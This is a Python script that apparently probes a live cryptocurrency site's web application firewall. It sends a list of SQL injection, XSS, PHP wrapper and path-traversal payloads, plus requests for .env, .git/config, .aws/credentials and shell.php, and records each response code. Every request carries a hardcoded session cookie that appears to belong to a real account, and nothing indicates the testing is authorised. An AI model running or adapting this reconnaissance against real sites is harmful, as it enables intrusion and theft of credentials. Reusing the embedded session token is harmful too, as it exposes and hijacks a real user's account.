import subprocess, urllib.parse

BASE = "https://bitcoinvn.io"
COOKIE = "REMEMBERME=%3Ab21uaWNvbm5lY3QwMEBnbWFpbC5jb20~%3A1794982284%3Alogin-method-v1%3AWyJnb29nbGUiLGZhbHNlLCJXaGt0cWxCVUwtdUlLRkI0M1AyQkcxNTJ2UFdXWktfdjhocUVUNzlvbUh3fjU2d0hobWFPRF9Ed0sySzlCUFJmOWpiOWd0dGpzUkJHQWNsMTNBQmZPbWN%2BIl0%3D%3Aca962b8ce904172eb281811fdf1f84efb603a9dc7f3f6382aa79fdf87866f46f; SID=002ed1eb0006b3d9e084200584a9250a"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    # path must already be properly percent-encoded where needed
    cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "10",
           "-H", f"Cookie: {COOKIE}", "-H", f"User-Agent: {UA}", BASE + path]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout.strip()
    return r

cases = [
  ("/?q=union select", "literal space"),
  ("/?q=union%20select", "encoded space"),
  ("/?q=hello world", "benign literal space"),
  ("/?q=hello%20world", "benign encoded space"),
  ("/?q=select%20from%20users", "select from users"),
  ("/?q=insert into", "insert into"),
  ("/?q=delete from", "delete from"),
  ("/?q=xor 1=1", "xor boolean"),
  ("/?q=' or ''='", "quote-or-quote"),
  ("/?q=1 AND 1=1", "AND tautology"),
  ("/?q=sleep(5)", "sleep alone"),
  ("/?q=benchmark(1,md5('a'))", "benchmark lower"),
  ("/?q=BENCHMARK(1,MD5('a'))", "BENCHMARK upper"),
  ("/?v=<script>", "open script tag only"),
  ("/?v=</script>", "close script tag only"),
  ("/?v=<img src=x onerror=alert(1)>", "full img onerror"),
  ("/?v=onerror=alert(1)", "onerror only"),
  ("/?v=javascript:alert(1)", "js uri"),
  ("/?v=prompt(1)", "prompt"),
  ("/?f=php://filter", "php filter"),
  ("/?f=php://input", "php input"),
  ("/?f=data://text/plain", "data uri"),
  ("/?f=/etc/passwd", "abs etc passwd"),
  ("/?f=../../etc/passwd", "traversal passwd"),
  ("/.env", ".env"),
  ("/.git/config", ".git config"),
  ("/.aws/credentials", ".aws creds"),
  ("/web.config", "web.config"),
  ("/xmlrpc.php", "xmlrpc.php"),
  ("/shell.php", "shell.php"),
]

print(f"{'PAYLOAD':<45} CODE")
for p,label in cases:
    # encode spaces and angle brackets for the request while keeping semantics
    enc = p.replace(" ", "%20").replace("<","%3C").replace(">","%3E").replace("'","%27")
    code = probe(enc)
    print(f"{label:<45} {code}")
